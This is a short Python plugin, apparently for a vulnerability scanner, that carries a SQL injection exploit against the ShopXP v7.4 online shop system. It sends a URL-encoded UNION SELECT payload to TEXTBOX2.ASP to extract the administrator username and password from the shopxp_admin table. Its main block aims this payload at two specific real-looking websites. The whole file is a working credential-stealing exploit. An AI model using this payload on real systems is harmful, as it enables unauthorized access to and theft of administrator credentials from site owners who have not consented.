# -*- coding:utf-8 -*-

#_PlugName_ = shopxp网上购物系统 v7.4 SQL爆管理员账户密码 
#_FileName_ = shopxp.py

import re
def assign(service, arg):
    if service == "shopxp":
		return True, arg

def audit(args):
	payload = "TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin"
	url = args + payload
	code, head, res, errcode, final_url = curl.curl(url)
	m = re.search('[0-9a-zA-Z]{16,31}', res)
	if code == 200 and m!=None:
		security_hole('sql injection:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('shopxp', 'http://www.yingzhilv.com/')[1])
	audit(assign('shopxp', 'http://www.4007051668.com/')[1])